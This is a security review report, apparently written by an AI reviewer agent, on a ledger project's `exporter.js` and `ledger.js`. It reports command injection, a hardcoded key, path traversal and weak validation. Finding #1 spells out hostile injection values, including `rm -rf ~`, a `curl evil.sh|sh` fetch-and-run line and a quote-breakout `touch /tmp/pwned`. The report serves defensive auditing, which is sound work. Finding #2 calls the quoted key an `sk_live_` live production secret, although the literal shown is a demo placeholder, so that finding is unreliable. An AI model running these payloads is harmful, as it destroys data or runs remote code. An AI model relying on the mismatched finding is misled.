# Security Report — Ledger #001

**Scope:** Security review of the files changed by the Bug Fixer for ledger bug #001.
Files reviewed in full:

- `src/ledger.js`
- `src/exporter.js`

The Fixer's changes themselves (debit subtraction in `getBalance`, inclusive range
bounds, and the `'Currency: USD'` report line) are functional and introduce no new
security weaknesses. However, reviewing the changed files in full surfaced **two serious
pre-existing vulnerabilities in `src/exporter.js`** plus minor hardening items. They live
in changed files and are in scope, so they are reported below.

---

## Findings

### 1. Command injection via `execSync` in `exportReport` — CRITICAL

- **File:** `src/exporter.js:32`
- **Code:** `execSync(`echo "${report}" > ${filename}`);`
- **Why exploitable:** The call shells out (`/bin/sh -c ...`) and interpolates **two
  untrusted values** directly into the command string:
  - `filename` is an unvalidated caller-supplied path. A value such as
    `report.txt; rm -rf ~` or `$(curl evil.sh|sh)` is executed by the shell. There is no
    quoting around `${filename}` at all.
  - `report` is built from ledger data (`summarizeByCategory` emits `tx.category` names —
    see `src/exporter.js:13-23` and `src/ledger.js:71-78`). A category string containing
    `"; touch /tmp/pwned; echo "` breaks out of the double-quoted `echo` argument and runs
    arbitrary commands. Category values flow in from `addTransaction`, which does **not**
    validate `category`.
  This is remote/attacker-controlled-input command execution — the highest-severity class.
- **Remediation:** Do not build a shell command from data. Write the file directly with
  `fs.writeFileSync(filename, report)`. If shelling out is truly required, use the
  argument-array form of `execFile`/`spawn` (no shell) and never interpolate untrusted
  strings, and validate/normalize `filename` against an allowed output directory to
  prevent path traversal and redirection.

### 2. Hardcoded live secret API key — HIGH

- **File:** `src/exporter.js:6` (also re-exported at `src/exporter.js:36`)
- **Code:** `const API_KEY = 'hardcoded-demo-secret-DO-NOT-USE';`
- **Why exploitable:** A `sk_live_`-prefixed secret (Stripe-style **live** secret key
  format) is committed in source and exported from the module
  (`module.exports = { ..., API_KEY }`). Anyone with repo/read access — or anyone the
  package is shipped to — obtains a production credential that can move money or read
  sensitive account data. Committed secrets persist in git history even if later removed.
- **Remediation:** Remove the literal from source and load from an environment variable or
  secret manager (`process.env.API_KEY`). **Rotate/revoke the exposed key immediately** —
  it must be treated as compromised. Purge it from git history (e.g. `git filter-repo`) and
  add a secret-scanning pre-commit hook to prevent recurrence. Do not export the secret
  from the module.

### 3. Unvalidated path enables arbitrary file write / traversal — MEDIUM

- **File:** `src/exporter.js:30-33`
- **Code:** `function exportReport(ledger, filename) { ... > ${filename}); }`
- **Why exploitable:** Even setting aside the shell-injection issue, `filename` is used
  as a write destination with no validation or confinement. A relative/absolute path such
  as `../../etc/something` or a path with `..` segments lets a caller overwrite files
  outside the intended output location.
- **Remediation:** Resolve `filename` against a fixed base output directory with
  `path.resolve`, and reject any resolved path that escapes that directory before writing.

### 4. Missing input validation in `getBalance` / `summarizeByCategory` — LOW

- **File:** `src/ledger.js:32-42` and `src/ledger.js:71-78`
- **Why relevant:** `addTransaction` validates `amount` and `type`, but `getBalance` and
  `summarizeByCategory` operate on `tx.amount` without re-checking. A ledger constructed by
  any path other than `addTransaction` (e.g. direct array literals, deserialized JSON) can
  contain non-numeric `amount`, yielding `NaN`/string-concatenation results silently. Not
  attacker-RCE, but a correctness/trust-boundary gap.
- **Remediation:** Centralize transaction validation, or defensively coerce/guard
  `tx.amount` (e.g. skip or throw on non-finite numbers) in the aggregation functions.

### 5. Report content is unescaped / not integrity-controlled — INFO

- **File:** `src/exporter.js:13-23`
- **Why relevant:** Category names and balances are concatenated verbatim into the report
  text. Independent of finding #1, if this report is ever rendered in a web view or another
  interpreter, the unescaped data is an injection vector (e.g. stored XSS). Currently
  plain-text only, so informational.
- **Remediation:** Treat report fields as data when rendering downstream; escape per the
  output context (HTML, CSV, shell, etc.).

---

## Severity Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Command injection via `execSync` (untrusted `filename` + `report`) | CRITICAL | `src/exporter.js:32` |
| 2 | Hardcoded live secret API key (committed + exported) | HIGH | `src/exporter.js:6`, `:36` |
| 3 | Unvalidated path → arbitrary file write / traversal | MEDIUM | `src/exporter.js:30-33` |
| 4 | Missing input validation in aggregation functions | LOW | `src/ledger.js:32-42`, `:71-78` |
| 5 | Unescaped report content (downstream injection risk) | INFO | `src/exporter.js:13-23` |

**Totals:** CRITICAL 1 · HIGH 1 · MEDIUM 1 · LOW 1 · INFO 1

**Top priority:** Findings #1 and #2 must be remediated before this code ships. Both are in
`src/exporter.js`; the Bug Fixer touched this file (added the report line) without
addressing the command injection or the committed secret directly above/below the change.
